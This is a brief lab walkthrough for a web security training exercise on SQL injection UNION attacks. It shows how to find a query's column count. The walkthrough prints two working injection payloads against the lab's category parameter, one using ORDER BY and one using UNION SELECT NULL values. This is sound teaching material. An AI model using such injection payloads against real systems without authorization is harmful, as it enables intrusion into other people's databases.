# Union Attacks > Determining the Number of Columns

### Objectives

- Determine the number of columns returned by the server using either `ORDER BY [NUM]` or `UNION SELECT [NULL,...]-- -` methods
- Once the number of columns is known, return an additional row containing a NULL values

### Solution

The `category` query parameter is vulnerable to a SQL Injection UNION attack. To determine the number of columns being returned in the response, use the following
SQL payload:

```
https://<burp-subdomain>.web-security-academy.net/filter?category=Accessories' ORDER BY 1-- -
```

Increment the count by 1 until you get an internal server error - specifying `ORDER BY 4-- -`, returns the error. So we now know the number of columns being
return is **3**.

To solve the challenge, use the following request to solve the challenge (notice we are using 3 NULLs because we determine each row returned in the response
consists of 3 columns):

```
https://<burp-subdomain>.web-security-academy.net/filter?category=Accessories' UNION SELECT NULL,NULL,NULL-- -
```
